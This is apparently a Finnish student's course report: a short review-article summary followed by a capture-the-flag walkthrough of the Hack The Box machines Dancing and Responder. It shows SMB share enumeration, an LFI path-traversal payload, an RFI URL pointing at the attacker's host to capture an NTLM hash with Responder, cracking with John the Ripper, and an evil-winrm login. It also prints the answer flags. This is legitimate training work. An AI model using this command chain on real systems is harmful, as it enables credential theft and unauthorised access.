# H5 Kohti omaa treeniä

## x) Lue & Tiivistä
- Start Your Research with a Review Article
  - Katsausartikkeli on tieteellinen julkaisu, joka kokoaa ja arvioi tieteellisiä julkaisuja.
  - JUFO määrittelee kuinka arvostettu tai luotettava julkaisukanava on.
  - JUFO luokitellaan numeroin 0-3. 0:n ei katsota olevan tieteellinen julkaisukanava kun taas 3 on arvostettu julkaisufoorumi. 
- A Comprehensive Literature Review of Artificial Intelligent Practices in the Field of Penetration Testing (Railkar, D.N. & Joshi, S. 2023.)
  - Perinteinen pentesting on manuaalista ja monimutkaista
  - Tekoälyä hyödyntäviä automasoituja pentesting (APT) malleja ollaan suuniteltu vahvistetun oppimisen avulla (reinforced learning). 
  - APT-mallit ovat automatisoineet pentestausta varsinkin haavoittuvuuksien tunnistamisessa, hyödyntämisessä ja raportoinnissa.
  - Vahvistetun oppimisen mallit vaikuttavat lupaavilta ja parantavat pentestingin tarkkuutta ja tehokkuutta. 

## a) HTB Dancing

Aloitin lataamalla .ovpn -tiedoston HTB Dancing tehtävänannosta. Tämän jälkeen käynnistin OpenVPN:n. 

```sudo openvpn starting_point_ridicculus.ovpn```

Käynnistyksen jälkeen sivulle ilmestyi ```SPAWN MACHINE```, josta sai käynnistettyä koneen. 

<img src="https://github.com/user-attachments/assets/98e06045-3cc7-4d81-a25f-78dc73668d36" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/cd4d4949-8ec1-4174-bc2d-e5b16ebe36f8" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/0ffae1aa-bd75-4b84-b44d-9d8764a1765e" width="500"> <br/>

Nyt pystyy aloittamaan lippujen etsimisen. Aloitin ensimmäisenä ajamalla nmapin, josta saikin moniin flageihin vastauksen. 

```sudo nmap -sV 10.129.240.71```

<img src="https://github.com/user-attachments/assets/820e5c36-b473-40de-a508-47935f8d4680" width="500"> <br/>

### What does the 3-letter acronym SMB stand for?

Flagin sain pääteltyä [googlen](https://en.wikipedia.org/wiki/Server_Message_Block) avulla. 

**Flag: Server Message Block**

<img src="https://github.com/user-attachments/assets/66e3a36e-b3fe-4005-a7e4-c01c8af2ecdd" width="500"> <br/>

### What port does SMB use to operate at?

Aiemman tiedonkeräyksen ja nmapin perusteella pystyi päättelemään flagin. 

**Flag: 445**

<img src="https://github.com/user-attachments/assets/12813b19-d0b0-409b-b209-ece1a7368a1e" width="500"> <br/>

### What is the service name for port 445 that came up in our Nmap scan?

Flagin sai nmapin tuloksista. 

**Flag: microsoft-ds **

<img src="https://github.com/user-attachments/assets/84e168c0-462b-4545-87cd-d15da127e3e3" width="500"> <br/>

### What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?

Tämän vastauksen saa ajamalla ```smbclient --help```, jonka avulla voi päätellä vastauksen. 

**Flag: -L**

<img src="https://github.com/user-attachments/assets/3f27865f-6ff3-4d39-b8ce-92354c7b2396" width="500"> <br/>

### How many shares are there on Dancing?

Tähän saa vastauksen ajamalla ```smbclient -L 10.129.240.71```. Salasanan voi jättää tyhjäksi. 

<img src="https://github.com/user-attachments/assets/4db54aaa-78d1-4375-a2c6-5a5293288106" width="500"> <br/>

**Flag: 4**

<img src="https://github.com/user-attachments/assets/bad22d66-c82a-4bea-9857-bc9180a6960a" width="500"> <br/>

### What is the name of the share we are able to access in the end with a blank password?

Tämän sain kokeilemalla yhdistää eri shareihin. 

```smbclient \\\\10.129.240.71\\ADMIN$```

```smbclient \\\\10.129.240.71\\C$```

```smbclient \\\\10.129.240.71\\IPC$```

```smbclient \\\\10.129.240.71\\WorkShares```

<img src="https://github.com/user-attachments/assets/303e4c13-6617-4cb6-8b71-a3b37cb3370b" width="500"> <br/>

**Flag: WorkShares**

<img src="https://github.com/user-attachments/assets/13bdc279-52df-41fc-b331-50ce57c3378f" width="500"> <br/>

### What is the command we can use within the SMB shell to download the files we find?

```help``` -komennolla saadaan näkyville kaikki komennot, joista voi päätellä ```get``` -komennon. 

<img src="https://github.com/user-attachments/assets/0522885d-dde4-4080-a549-5b6f2612a27f" width="500"> <br/>

**Flag: get**

<img src="https://github.com/user-attachments/assets/dd4f7811-def3-43e0-8c75-e96596921651" width="500"> <br/>


### Submit root flag

Käyttämällä ```ls``` -komentoa voidaan navigoida ympäristössä ja löytää haluttu tiedosto ```flag.txt``` kansiosta ```James.P```

Tämän saa ladattua ```get``` -komennolla. 

```get flag.txt```

```exit```

```cat flag.txt```

<img src="https://github.com/user-attachments/assets/359c65e5-8fdf-4c32-a611-46a6dbd6ac2f" width="500"> <br/>

**Flag: 5f61c10dffbc77a704d76016a22f1664**

<img src="https://github.com/user-attachments/assets/cf8a1499-b3f6-45c3-a54b-4bdc2c80be78" width="500"> <br/>

## b) HTB Responder

### When visiting the web service using the IP address, what is the domain that we are being redirected to?

Tämä löytyy yhdistämällä selaimella tai curlilla ip osoitteeseen. 

<img src="https://github.com/user-attachments/assets/7c9b4c6b-aa56-4c4d-ad24-ab7e8f64c51e" width="500"> <br/>

**Flag: unika.htb**

### Which scripting language is being used on the server to generate webpages?

Sillä emme pysty muuten yhdistämään sivuun, lisätään unika.htb yhdistymään oikeaan ip-osoitteeseen muokkaamalla ```etc/hosts``` -tiedostoa. 

```echo "10.129.117.85 unika.htb" | sudo tee -a /etc/hosts```

Aloitin tutkimaan sivun ```Page Source```:a ja alkuun ajattelin kyseessä olevan js, mutta pienen selailun jälkeen löytyi tämä

```bash
<a href="/index.php?page=french.html">FR</a>
<a href="/index.php?page=german.html">DE</a>
```

```index.php?``` voidaan päätellä kielen olevan php. 

**Flag: php**

### What is the name of the URL parameter which is used to load different language versions of the webpage?

Tämä selvisikin jo aiemmassa

**Flag: page**

### Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

Tämä on siis sama kuin aiemmin kurssilla käyty path traversal, josta voi päätellä sen olevan ```../../../../../../../../windows/system32/drivers/etc/hosts```. 

**Flag: ../../../../../../../../windows/system32/drivers/etc/hosts**

### Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

Vasstaus on ```//10.10.14.6/somefile```, jonka avulla voidaan palvelin ajamaan haluttua tiedostoa. 

**Flag: //10.10.14.6/somefile**

### What does NTLM stand for?

Pienellä googlailulla selviää, että kyseessä on ```New Technology LAN Manager```

**Flag: New Technology LAN Manager**

### Which flag do we use in the Responder utility to specify the network interface?

Löytyy [Kalin dokumentaatiosta](https://www.kali.org/tools/responder/) ```-I```. 

**Flag: -I**

### There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.

Aiemmin kurssilla käytetty työkalu, ```John the Ripper```

**Flag: John the Ripper**

### What is the password for the administrator user?

Tämän saamiseksi pitää ensin saada kaivettua Responderin avulla Hash ja murtaa se John the Ripperin avulla. 

Ennen tätä meidän pitää selvittää oma IP, jotta voimme sisällyttää senn RFI hyökkäykseen. 

```ip -A | grep tun```

<img src="https://github.com/user-attachments/assets/75d55c04-78d7-4a71-b95e-3d823ce20290" width="500"> <br/>

Käynnistetään Responder ja hyödynnetään aiemmin mainittua RFI haavoittuvuutta. 

```sudo responder -I tun0```

Tämän jälkeen selaimella yritetään tehdä RFI hyökkäystä. 

```http://unika.htb/?page=//10.10.16.4/somefile```

Muutaman yrityksen jälkeen responder oli napannut talteen Hashin. 

<img src="https://github.com/user-attachments/assets/e4d97cad-abb6-4578-9da3-fa51fb8dbc93" width="500"> <br/>

Tallenetaan tämä napattu hash ```hash.txt``` tiedostoon nanon avulla. 

```nano hash.txt```

Tämän jälkeen voidaan yrittää murtaa salasana John the Ripperillä. 

```john -w=rockyou.txt hash.txt```

<img src="https://github.com/user-attachments/assets/128001db-c01a-4fa7-bf68-5d35fe32372f" width="500"> <br/>

**Flag: badminton**

### We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

Portti löytyy [evil-winrm:n dokumentaatiosta](https://github.com/Hackplayers/evil-winrm): ```5985```


**Flag: 5985**

### Submit root flag

Kun tunnus ja salasana on tiedossa, voimme käyttää evil-winrm:ää yhdistämään kohteeseen. 

```evil-winrm -i 10.129.117.85 -u administrator -p badminton```

<img src="https://github.com/user-attachments/assets/f2cbc575-bc7e-46c1-bf3d-24f73df25897" width="500"> <br/>

Kokeilin alkuun navigoida koneessa ```dir``` ja ```cd``` -komennoilla, mutta nämä antoivat vain tyhjää vastausta. Kokeilin lopuksi komentoa ```cd ..```, jonka jälkeen myös ```dir``` alkoi antaa vastausta. 
Tämä johtui siis siitä, että ```C:\Users\Administrator\Documents``` oli tyhjä kansio. 

<img src="https://github.com/user-attachments/assets/752abb39-a316-4e21-9a70-e0fe6a603770" width="500"> <br/>

Jonkin aikaa seilaultuani löytyi kansio ```C:\Users\mike```, jonka työpöytäkansiosta ```C:\Users\mike\Desktop``` löytyi tiedosto ```flag.txt```. 

```type flag.txt```

<img src="https://github.com/user-attachments/assets/80a7ccd2-60bd-4b29-967a-e301dfebcde2" width="500"> <br/>

**Flag: ea81b7afddd03efaa0945333ed147fac**



## Ajankäyttö: 

- Materiaalien lukemiseen ja tiivistämiseen n. 1h
- Tehtäviin ja materiaalien lukemiseen n. 2h. 
- Raportointiin ja dokumentointiin n. 2h. 

## Lähteet: 

Karvinen, T. 2025. Tunkeutumistestaus.    
https://terokarvinen.com/tunkeutumistestaus/    
Tehtävänanto.    

Karvinen, T. 2025. Start Your Research with a Review Article.    
https://terokarvinen.com/review-article/    
Tehtävä x.    

Railkar, D.N. & Joshi, S. 2023. A comprehensive literature review of artificial intelligent practices in the field of penetration testing. Intelligent Systems and Applications: Select Proceedings of ICISA 2022 (2023). s. 75-85.    

Wikipedia. s.a. Server Message Block.    
https://en.wikipedia.org/wiki/Server_Message_Block    
Tehtävä a.    

Wikipedia. s.a. NTLM.    
https://en.wikipedia.org/wiki/NTLM    
Tehtävä b.    

Kali. s.a. Responder.    
https://www.kali.org/tools/responder/    
Tehtävä b.    

GitHub. s.a. Evil-winrm.    
https://github.com/Hackplayers/evil-winrm    
Tehtävä b.    
